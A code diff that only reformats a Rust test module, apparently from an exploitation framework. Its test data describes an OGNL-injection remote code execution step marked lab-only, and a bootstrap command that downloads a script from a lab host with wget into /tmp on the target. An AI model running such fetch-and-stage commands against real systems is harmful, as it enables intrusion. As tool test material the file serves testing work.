@@ -705,7 +705,9 @@ mod tests {
             requires_outbound_callback: true,
             expected_effect: Some("Remote Code Execution".into()),
             safety_class: Some("lab-only".into()),
-            summary: Some("OGNL injection via HTTP; freemarker.Execute; one OS command per request".into()),
+            summary: Some(
+                "OGNL injection via HTTP; freemarker.Execute; one OS command per request".into(),
+            ),
         });
     }
 
@@ -789,7 +791,9 @@ mod tests {
             bootstrap_plan: Some(BootstrapPlan {
                 steps: vec![BootstrapStep {
                     action: BootstrapAction::OgnlExec {
-                        commands: vec!["wget http://172.21.0.2:8001/bootstrap.sh -O /tmp/b.sh".into()],
+                        commands: vec![
+                            "wget http://172.21.0.2:8001/bootstrap.sh -O /tmp/b.sh".into()
+                        ],
                         port: Some(8080),
                         path_prefix: None,
                         extra_headers: vec![],
